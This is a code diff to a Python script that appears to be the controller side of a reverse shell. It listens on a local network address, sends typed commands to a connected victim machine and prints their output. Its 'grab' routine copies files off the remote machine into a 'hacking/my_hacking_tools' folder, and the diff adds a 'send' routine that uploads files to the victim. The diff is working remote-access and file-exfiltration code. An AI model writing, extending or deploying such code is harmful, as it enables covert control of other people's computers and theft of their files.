@@ -4,9 +4,9 @@ import socket
 
 def transfer(conn, command):
     conn.send(command.encode())
+    print('here')
     grab, path = command.split("*")
-    # the path in your machine
-    f = open('/Users/ilya/Desktop ' + path, 'wb')
+    f = open('/Users/ilya/hacking/my_hacking_tools/ ' + path, 'wb')
     while True:
         bits = conn.recv(1024)
         if bits.endswith('DONE'.encode()):
@@ -19,10 +19,24 @@ def transfer(conn, command):
             break
         f.write(bits)
 
+def download(conn, command):
+    conn.send(command.encode())
+    send, command = command.split("*")
+    if os.path.exists("/root/PycharmProjects/pythonProjectLsson1/"+command):
+        print(os.path.exists("/root/PycharmProjects/pythonProjectLsson1/"+command))
+        f = open("/root/PycharmProjects/pythonProjectLsson1/"+command, 'rb')
+        packet = f.read(1024)
+        while len(packet) > 0:
+            conn.send(packet)
+            packet = f.read(1024)
+        conn.send('DONE'.encode())
+    else:
+        print("here")
+        conn.send('File not found'.encode())
 
 def connecting():
     s = socket.socket()
-    s.bind(("192.168.1.24", 4448))
+    s.bind(("192.168.1.24", 4445))
     s.listen(1)
     print('[+] Listening for income TCP connection on port 8080')
     conn, addr = s.accept()
@@ -35,6 +49,16 @@ def connecting():
             break
         elif 'grab' in command:
             transfer(conn, command)
+
+        elif command == "":
+            pass
+
+        elif 'send' in command:
+            try:
+                download(conn, command)
+            except Exception as e:
+                print(e)
+
         else:
             conn.send(command.encode())
             print(conn.recv(1024).decode("utf-8", "ignore"))
